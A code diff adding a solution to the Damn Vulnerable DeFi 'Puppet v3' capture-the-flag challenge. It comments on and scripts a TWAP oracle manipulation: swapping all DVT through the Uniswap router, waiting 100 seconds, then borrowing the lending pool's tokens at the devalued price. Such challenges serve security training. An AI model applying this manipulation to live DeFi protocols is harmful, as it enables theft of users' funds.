@@ -6,6 +6,9 @@ const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/N
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
 const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
 
+const routerJson = require('@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json');
+  
+  // deploy the bytecode
 // See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
 const bn = require("bignumber.js");
 bn.config({ EXPONENTIAL_AT: 999999, DECIMAL_PLACES: 40 });
@@ -26,7 +29,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = require("./rpc_url.json").RPC_URL;
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -138,8 +141,100 @@ describe('[Challenge] Puppet v3', function () {
         initialBlockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
     });
 
+    /**
+     * @dev
+     * Overview of exploit:
+     *
+     * Exploit is very similar to Puppet-V2 except this uses Uniswap's V3 Time
+     * Weighted Average Price (TWAP) to calculate the price. We also need to
+     * connect to Uniswaps Router to make our lives easier.
+     *
+     * This can be exploited if the TWAP period is short enough that it is still
+     * suseptible to short term violatility, which is exactly what happens here.
+     *
+     * We make a trade buying all WETH in the pool, heavily devaluing the DVT
+     * token relative to the WETH token.
+     *
+     * However if we were to get the price directly after the trade, the price
+     * would still be 1:1 since the new price has a Time Weight of 0.
+     *
+     * So we need to wait a few minutes for the TWAP to move to an appropriate
+     * price (110 seconds) then call the lending pool which then uses the
+     * heavily devalued price
+     */
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const log = console.log;
+
+        // Connect to contracts as attacker
+        const attackPool = await uniswapPool.connect(player);
+        const attackLendingPool = await lendingPool.connect(player);
+        const attackToken = await token.connect(player);
+        const attackWeth = await weth.connect(player);
+
+        // Helper function to log balances of addresses
+        const logBalances = async (name, address) => {
+            const dvt_bal = await attackToken.balanceOf(address);
+            const weth_bal = await weth.balanceOf(address);
+            const eth_bal = await ethers.provider.getBalance(address);
+            log(`Logging balance of ${name}`);
+            log('DVT:', ethers.utils.formatEther(dvt_bal))
+            log('WETH:', ethers.utils.formatEther(weth_bal))
+            log('ETH:', ethers.utils.formatEther(eth_bal))
+            log('')
+        };
+
+        await logBalances("Player", player.address)
+
+        // Helper function to get quotes from the Lending pool
+        const getQuote = async(amount, print=true) => {
+            const quote = await attackLendingPool.calculateDepositOfWETHRequired(amount);
+            if (print) log(`Quote of ${ethers.utils.formatEther(amount)} DVT is ${ethers.utils.formatEther(quote)} WETH`)
+            return quote
+        }
+
+        const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
+        log(`Connecting to uniswap router at mainnet address ${uniswapRouterAddress}`)
+        const uniswapRouter = new ethers.Contract(uniswapRouterAddress, routerJson.abi, player);
+
+        log("Approving all player tokens to be taken from the uniswap router");
+        await attackToken.approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        log("Swapping all player tokens for as much WETH as possible.");
+        await uniswapRouter.exactInputSingle(
+            [attackToken.address,
+            weth.address,   
+            3000,
+            player.address,
+            PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
+            0,
+            0],
+            {
+                gasLimit: 1e7
+            }
+        );
+
+        await logBalances("Player", player.address)
+        await logBalances("Uniswap Pool", attackPool.address)
+
+        // Increase block time by 100 seconds
+        log("Increasing block time by 100 seconds")
+        await time.increase(100);
+
+        // Get new quote for borrow and approve lending pool for that amount
+        log("Getting new quote and approving lending pool for transfer");
+        const quote = await getQuote(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        await attackWeth.approve(attackLendingPool.address, quote);
+
+        // Borrow the funds
+        log("Borrowing funds");
+        await attackLendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        await logBalances("Player", player.address);
+        await logBalances("Lending Pool", attackLendingPool.address)
+        
+        // Exploit finished
     });
 
     after(async function () {
